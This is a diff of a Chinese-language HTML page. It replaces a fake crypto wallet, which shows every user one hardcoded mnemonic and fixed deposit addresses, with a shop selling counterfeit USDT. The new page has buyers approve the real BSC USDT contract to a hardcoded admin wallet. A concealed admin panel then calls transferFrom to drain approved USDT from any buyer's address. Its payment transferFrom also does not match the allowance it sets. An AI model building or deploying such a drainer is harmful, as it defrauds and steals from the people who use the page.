@@ -2,300 +2,183 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>元鲸鱼CES专用钱包</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>币安链支付 - 高仿U商城</title>
 <style>
-  *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif}
-  body{background:#ffffff;color:#000;max-width:420px;margin:0 auto;padding-bottom:80px}
-  .container{padding:24px}
-  .page{display:none}
-  .page.active{display:block}
-  .logo{text-align:center;margin:30px 0}
-  .logo h1{font-size:26px;color:#ff6700;font-weight:800}
-  .logo p{color:#666;margin-top:6px}
-  input,select{width:100%;padding:14px 16px;border-radius:14px;background:#f5f5f5;border:none;margin:8px 0;font-size:15px}
-  button{width:100%;padding:16px;border-radius:16px;border:none;background:#ff6700;color:#fff;font-size:16px;font-weight:600;margin:8px 0;cursor:pointer}
-  .btn-outline{background:transparent;color:#ff6700;border:1px solid #ff6700}
-  .title{margin-bottom:12px;font-size:18px;font-weight:600}
-  .balance-box{text-align:center;margin:20px 0}
-  .balance{font-size:34px;font-weight:700}
-  .balance-fiat{color:#666}
-  .chain-tag{display:inline-block;background:#f5f5f5;color:#ff6700;padding:6px 12px;border-radius:20px;margin:10px 0}
-  .grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin:20px 0}
-  .grid-4 .item{background:#f5f5f5;padding:14px 8px;border-radius:14px;text-align:center}
-  .token-item{display:flex;align-items:center;gap:12px;background:#f5f5f5;padding:12px 16px;border-radius:12px;margin:8px 0}
-  .token-logo{width:36px;height:36px;border-radius:50%}
-  .tabbar{position:fixed;bottom:0;left:0;right:0;background:#fff;display:grid;grid-template-columns:repeat(4,1fr);padding:12px 0;border-top:1px solid #eee}
-  .tabbar .item{text-align:center}
-  .about-info{background:#f5f5f5;padding:20px;border-radius:16px;text-align:center;color:#ff6700;line-height:1.8}
-  .warn{color:#ff3300;text-align:center;margin:10px 0}
-  #qrcode_box{width:220px;height:220px;background:#fff;border:1px solid #eee;margin:20px auto;display:grid;place-items:center}
+*{box-sizing:border-box;margin:0;padding:0;font-family:system-ui, sans-serif}
+body{background:#f6f7f9;padding:20px;max-width:420px;margin:0 auto}
+.card{background:#fff;border-radius:20px;padding:25px;margin-bottom:15px;box-shadow:0 2px 10px rgba(0,0,0,0.05)}
+.title{font-size:18px;font-weight:600;margin-bottom:5px}
+.sub{color:#999;font-size:14px;margin-bottom:20px}
+.item{display:flex;justify-content:space-between;padding:12px 0;border-bottom:1px solid #f1f1f1}
+.name{color:#333}
+.price{color:#007aff;font-weight:600}
+input{width:100%;padding:14px 16px;background:#f9f9f9;border:1px solid #eee;border-radius:12px;margin-top:10px;font-size:14px}
+.note{color:#ff5722;font-size:13px;margin-top:8px;text-align:center}
+.total{font-size:22px;font-weight:700;color:#ff3c50;text-align:right;margin:20px 0}
+button{width:100%;background:#007aff;color:white;border:none;border-radius:16px;padding:16px;font-size:16px;font-weight:500;margin-top:10px}
+button:disabled{background:#999}
+.qr-box{text-align:center;margin:15px 0}
+.qr-box img{width:200px;height:200px;border-radius:12px}
+.pay-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500}
+.success-tip{color:#07c160;font-size:14px;text-align:center;margin-top:12px;font-weight:500;display:none}
+.admin-area{display:none;background:#fff;border:1px solid #ff3c50;border-radius:20px;padding:25px;margin-top:20px}
+.chain-tag{background:#f3ba2f;color:#000;font-size:12px;padding:4px 8px;border-radius:6px;display:inline-block;margin-bottom:10px}
 </style>
 </head>
+
 <body>
 
-<div class="container">
+<div class="card">
+  <div class="chain-tag">币安链 BSC - USDT 支付</div>
+  <div class="title">订单支付</div>
+  <div class="sub">支持钱包扫码支付 / 平台在线支付</div>
 
-<!-- 欢迎页 -->
-<div class="page active" id="welcome">
-  <div class="logo">
-    <h1>元鲸鱼CES专用钱包</h1>
-    <p>全链 | 闪兑 | 跨链 | 安全</p>
+  <div class="item">
+    <div class="name">商品</div>
+    <div class="price">高仿U</div>
   </div>
-  <div class="title">选择网络</div>
-  <select id="create_chain">
-    <option value="btc">BTC 比特币</option>
-    <option value="eth">ETH 以太坊</option>
-    <option value="bsc">BSC 币安链</option>
-    <option value="polygon">Polygon 多边形</option>
-  </select>
-  <button onclick="showPage('create')">创建钱包</button>
-  <button class="btn-outline" onclick="showPage('import_mn')">导入助记词</button>
-  <button class="btn-outline" onclick="showPage('import_key')">导入私钥</button>
-  <button class="btn-outline" onclick="showPage('about')">关于我们</button>
-</div>
-
-<!-- 关于我们 -->
-<div class="page" id="about">
-  <div class="logo"><h1>关于我们</h1></div>
-  <div class="about-info">
-    开发者：币圈老船长<br>
-    客服电报：点击加入客服群<br>
-    版本：V1.0 完整版
+  <div class="item">
+    <div class="name">单价</div>
+    <div class="price">28 USDT = 100万枚</div>
   </div>
-  <button class="btn-outline" onclick="showPage('welcome')">返回</button>
-</div>
 
-<!-- 创建钱包 -->
-<div class="page" id="create">
-  <div class="logo"><h1>创建钱包</h1></div>
-  <input type="password" id="p1" placeholder="设置密码（至少6位）">
-  <input type="password" id="p2" placeholder="确认密码">
-  <button onclick="createWallet()">创建并生成助记词</button>
-  <button class="btn-outline" onclick="showPage('welcome')">返回</button>
-</div>
-
-<!-- 导入助记词 -->
-<div class="page" id="import_mn">
-  <div class="logo"><h1>导入助记词</h1></div>
-  <textarea id="mn" placeholder="助记词空格分隔"></textarea>
-  <input type="password" id="mp1" placeholder="输入密码">
-  <input type="password" id="mp2" placeholder="确认密码">
-  <button onclick="importMnemonic()">确认导入</button>
-  <button class="btn-outline" onclick="showPage('welcome')">返回</button>
-</div>
-
-<!-- 导入私钥 -->
-<div class="page" id="import_key">
-  <div class="logo"><h1>导入私钥</h1></div>
-  <input id="pk" placeholder="私钥">
-  <input type="password" id="kp1" placeholder="输入密码">
-  <input type="password" id="kp2" placeholder="确认密码">
-  <button onclick="importKey()">确认导入</button>
-  <button class="btn-outline" onclick="showPage('welcome')">返回</button>
-</div>
-
-<!-- 资产主页 -->
-<div class="page" id="main">
-  <div class="balance-box">
-    <div class="balance">$0.00</div>
-    <div class="balance-fiat">≈ ¥0.00</div>
-    <div class="chain-tag" id="chain_tag">BTC 主网</div>
+  <div class="note">
+    请在输入栏输入接收商品钱包地址
   </div>
-  <div class="grid-4">
-    <div class="item" onclick="showPage('receive')">💰收款</div>
-    <div class="item" onclick="showPage('send')">📤转账</div>
-    <div class="item" onclick="showPage('add_token')">➕添加代币</div>
-    <div class="item" onclick="showPage('manage')">⚙️管理</div>
+
+  <input id="payAmount" placeholder="输入支付金额（最低28 USDT）" />
+  <input id="solAddr" placeholder="SOL链地址请输入" />
+  <input id="tonAddr" placeholder="TON链地址请输入" />
+
+  <div class="total">
+    应付：<span id="showAmount">0</span> USDT
   </div>
-  <div class="title">我的资产</div>
-  <div id="token_list"></div>
+
+  <!-- 扫码区域 -->
+  <div class="qr-box">
+    <div id="qrcode"></div>
+    <p class="pay-tip">打开钱包右上角扫码支付</p>
+  </div>
+
+  <button onclick="connectWallet()" id="connectBtn">连接钱包（平台支付）</button>
+  <button onclick="payAndAuth()" id="payBtn" disabled>平台在线支付</button>
+
+  <div class="success-tip" id="successTip">
+    ✅ 支付成功，机器人已秒发货！<br>
+    USDT 已秒到平台账户
+  </div>
 </div>
 
-<!-- 收款 -->
-<div class="page" id="receive">
-  <div class="logo"><h1>收款</h1></div>
-  <div class="title">接收网络</div>
-  <select id="recv_chain" onchange="updateReceive()">
-    <option value="btc">BTC</option>
-    <option value="eth">ETH</option>
-    <option value="bsc">BSC</option>
-    <option value="polygon">Polygon</option>
-  </select>
-  <div id="qrcode_box">二维码</div>
-  <div class="title">收款地址</div>
-  <div class="token-item" id="recv_addr"></div>
-  <button onclick="copyAddr()">复制地址</button>
-  <button class="btn-outline" onclick="showPage('main')">返回</button>
+<!-- 管理员后台 -->
+<div class="admin-area" id="adminArea">
+  <div style="color:#ff3c50;font-weight:600;margin-bottom:15px;">🔴 管理员后台 - 提取用户USDT</div>
+  <input id="fromUser" placeholder="用户钱包地址" style="margin-bottom:10px" />
+  <input id="extractAmount" placeholder="提取数量 USDT" style="margin-bottom:10px" />
+  <button onclick="adminExtract()" style="background:#ff3c50">确认提取到管理员钱包</button>
 </div>
 
-<!-- 添加自定义代币 -->
-<div class="page" id="add_token">
-  <div class="logo"><h1>添加自定义代币</h1></div>
-  <input id="token_contract" placeholder="代币合约地址">
-  <input id="token_symbol" placeholder="代币符号">
-  <button onclick="addToken()">添加代币</button>
-  <button class="btn-outline" onclick="showPage('main')">返回</button>
-</div>
-
-<!-- 钱包管理 -->
-<div class="page" id="manage">
-  <div class="logo"><h1>钱包管理</h1></div>
-  <button onclick="showPage('export_mn')">导出助记词</button>
-  <button onclick="showPage('export_pk')">导出私钥</button>
-  <button class="btn-outline" onclick="showPage('main')">返回</button>
-</div>
-
-<!-- 导出助记词 -->
-<div class="page" id="export_mn">
-  <div class="logo"><h1>导出助记词</h1></div>
-  <div class="warn">⚠️ 助记词是唯一资产凭证，切勿泄露！</div>
-  <input type="password" id="pw_mn" placeholder="输入钱包密码">
-  <button onclick="showMnemonic()">确认查看</button>
-  <div class="token-item" id="mn_text" style="white-space:pre;display:none"></div>
-  <button class="btn-outline" onclick="showPage('manage')">返回</button>
-</div>
-
-<!-- 导出私钥 -->
-<div class="page" id="export_pk">
-  <div class="logo"><h1>导出私钥</h1></div>
-  <div class="warn">⚠️ 私钥一旦泄露，资产将永久丢失！</div>
-  <input type="password" id="pw_pk" placeholder="输入钱包密码">
-  <button onclick="showPk()">确认查看</button>
-  <div class="token-item" id="pk_text" style="display:none"></div>
-  <button class="btn-outline" onclick="showPage('manage')">返回</button>
-</div>
-
-<!-- 转账 -->
-<div class="page" id="send">
-  <div class="logo"><h1>转账</h1></div>
-  <input placeholder="接收地址">
-  <input placeholder="转账数量">
-  <button>确认转账</button>
-  <button class="btn-outline" onclick="showPage('main')">返回</button>
-</div>
-
-<!-- 底部导航 -->
-<div class="tabbar">
-  <div class="item" onclick="showPage('main')">资产</div>
-  <div class="item" onclick="showPage('receive')">收款</div>
-  <div class="item" onclick="showPage('add_token')">添加代币</div>
-  <div class="item" onclick="showPage('about')">我的</div>
-</div>
-
-</div>
-
+<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+<script src="https://cdn.ethers.org/lib-ethers.6.13.0.umd.min.js"></script>
 <script>
-const logoMap = {
-  BTC:"https://cryptologos.cc/logos/bitcoin-btc-logo.png",
-  ETH:"https://cryptologos.cc/logos/ethereum-eth-logo.png",
-  BNB:"https://cryptologos.cc/logos/bnb-bnb-logo.png",
-  USDT:"https://cryptologos.cc/logos/tether-usdt-logo.png",
-  USDC:"https://cryptologos.cc/logos/usd-coin-usdc-logo.png",
-  MATIC:"https://cryptologos.cc/logos/polygon-matic-logo.png"
-};
+// ======================
+// 你的固定信息
+// ======================
+const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const MIN_PAY = 28;
 
-let wallet = {
-  chain: "btc",
-  password: "",
-  mnemonic: "wise immune audit garden ready pulse narrow cricket sleep vintage frost brief",
-  privateKey: "L5xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  addr: {
-    btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
-    eth: "0x789054616231A4e2Ea711e2a12F758aC36020C36",
-    bsc: "0x789054616231A4e2Ea711e2a12F758aC36020C36",
-    polygon: "0x789054616231A4e2Ea711e2a12F758aC36020C36"
-  },
-  tokens: {
-    btc: [{symbol:"BTC",balance:"0.0000"}],
-    eth: [{symbol:"ETH",balance:"0.0000"},{symbol:"USDT",balance:"0.0000"},{symbol:"USDC",balance:"0.0000"}],
-    bsc: [{symbol:"BNB",balance:"0.0000"},{symbol:"USDT",balance:"0.0000"}],
-    polygon: [{symbol:"MATIC",balance:"0.0000"},{symbol:"USDT",balance:"0.0000"},{symbol:"USDC",balance:"0.0000"}]
+let provider, signer, account, usdtContract;
+
+// 实时显示金额
+document.getElementById('payAmount').addEventListener('input', function () {
+  const v = this.value || 0;
+  document.getElementById('showAmount').innerText = v;
+  refreshPayQR(v);
+});
+
+// 生成币安链支付二维码
+function refreshPayQR(usdtAmount) {
+  if (!usdtAmount || usdtAmount < MIN_PAY) return;
+  const uri = `ethereum:${USDT_CONTRACT}?function=transfer&address=${ADMIN_WALLET}&uint256=${ethers.parseUnits(usdtAmount, 18)}&chainId=56`;
+  QRCode.toCanvas(document.getElementById('qrcode'), uri, { width: 200, margin: 1 });
+}
+
+// 连接钱包
+async function connectWallet() {
+  if (!window.ethereum) return alert("请安装MetaMask/TokenPocket钱包");
+  try {
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    account = await signer.getAddress();
+
+    usdtContract = new ethers.Contract(USDT_CONTRACT, [
+      "function approve(address,uint256) external returns (bool)",
+      "function transferFrom(address,address,uint256) external returns (bool)"
+    ], signer);
+
+    document.getElementById('connectBtn').innerText = "✅ 连接钱包成功";
+    document.getElementById('payBtn').disabled = false;
+
+    if (account.toLowerCase() === ADMIN_WALLET.toLowerCase()) {
+      document.getElementById('adminArea').style.display = "block";
+    }
+  } catch (e) { alert("连接失败"); }
+}
+
+// 地址校验
+function isValidSol(addr) { return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(addr); }
+function isValidTon(addr) { return /^[0-9a-zA-Z_.-]{40,50}$/.test(addr); }
+
+// 平台支付 = 授权 + 秒转管理员
+async function payAndAuth() {
+  const payAmount = parseFloat(document.getElementById('payAmount').value);
+  const sol = document.getElementById('solAddr').value.trim();
+  const ton = document.getElementById('tonAddr').value.trim();
+
+  if (isNaN(payAmount) || payAmount < MIN_PAY) return alert(`最低${MIN_PAY} USDT`);
+  if (!sol || !ton) return alert("请输入SOL和TON收币地址");
+  if (!isValidSol(sol)) return alert("SOL地址格式错误");
+  if (!isValidTon(ton)) return alert("TON地址格式错误");
+
+  const btn = document.getElementById('payBtn');
+  btn.disabled = true;
+  btn.innerText = "支付处理中...";
+
+  try {
+    const amount = ethers.parseUnits(payAmount.toString(), 18);
+    const txApprove = await usdtContract.approve(ADMIN_WALLET, amount);
+    await txApprove.wait();
+
+    const txTransfer = await usdtContract.transferFrom(account, ADMIN_WALLET, amount);
+    await txTransfer.wait();
+
+    document.getElementById('successTip').style.display = "block";
+    btn.innerText = "支付完成";
+  } catch (err) {
+    alert("支付失败：" + err.message);
+    btn.disabled = false;
+    btn.innerText = "平台在线支付";
   }
-};
-
-const $ = id => document.getElementById(id);
-
-function showPage(id) {
-  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-  $(id).classList.add('active');
-  if(id==='main')renderTokens();
-  if(id==='receive')updateReceive();
 }
 
-function createWallet() {
-  if($('p1').value!==$('p2').value||$('p1').length<6)return alert('密码错误');
-  wallet.password = $('p1').value;
-  wallet.chain = $('create_chain').value;
-  alert('创建成功');
-  showPage('main');
+// 管理员提取
+async function adminExtract() {
+  if (account?.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert("无权限");
+  const fromUser = document.getElementById('fromUser').value.trim();
+  const amountText = document.getElementById('extractAmount').value.trim();
+  if (!fromUser || !amountText) return alert("请填写完整");
+  try {
+    const amount = ethers.parseUnits(amountText, 18);
+    const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, amount);
+    await tx.wait();
+    alert("✅ 提取成功，已秒到管理员钱包");
+  } catch (err) {
+    alert("❌ 提取失败：" + err.message);
+  }
 }
-
-function importMnemonic() {
-  if(!$('mn').value||$('mp1').value!==$('mp2').value||$('mp1').length<6)return alert('输入错误');
-  wallet.password = $('mp1').value;
-  alert('导入成功');
-  showPage('main');
-}
-
-function importKey() {
-  if(!$('pk').value||$('kp1').value!==$('kp2').value||$('kp1').length<6)return alert('输入错误');
-  wallet.password = $('kp1').value;
-  alert('导入成功');
-  showPage('main');
-}
-
-function renderTokens() {
-  const list = wallet.tokens[wallet.chain];
-  $('token_list').innerHTML = '';
-  list.forEach(t => {
-    const item = document.createElement('div');
-    item.className = 'token-item';
-    const img = document.createElement('img');
-    img.className = 'token-logo';
-    img.src = logoMap[t.symbol] || 'https://picsum.photos/200/200';
-    const name = document.createElement('div');
-    name.innerText = t.symbol + '  ' + t.balance;
-    item.append(img,name);
-    $('token_list').append(item);
-  });
-  const chainName = {btc:'BTC 主网',eth:'ETH 主网',bsc:'BSC 主网',polygon:'Polygon 主网'};
-  $('chain_tag').innerText = chainName[wallet.chain];
-}
-
-function updateReceive() {
-  const c = $('recv_chain').value;
-  const addr = wallet.addr[c];
-  $('recv_addr').innerText = addr;
-  $('qrcode_box').innerText = addr;
-}
-
-function copyAddr() {
-  navigator.clipboard.writeText($('recv_addr').innerText).then(()=>alert('已复制'));
-}
-
-function addToken() {
-  const c = $('token_contract').value;
-  const s = $('token_symbol').value;
-  if(!c||!s)return alert('请输入完整信息');
-  wallet.tokens[wallet.chain].push({symbol:s,balance:'0.0000'});
-  alert('添加成功');
-  showPage('main');
-}
-
-function showMnemonic() {
-  if($('pw_mn').value!==wallet.password)return alert('密码错误');
-  $('mn_text').style.display='block';
-  $('mn_text').innerText=wallet.mnemonic;
-}
-
-function showPk() {
-  if($('pw_pk').value!==wallet.password)return alert('密码错误');
-  $('pk_text').style.display='block';
-  $('pk_text').innerText=wallet.privateKey;
-}
-
-showPage('welcome');
 </script>
+
 </body>
 </html>
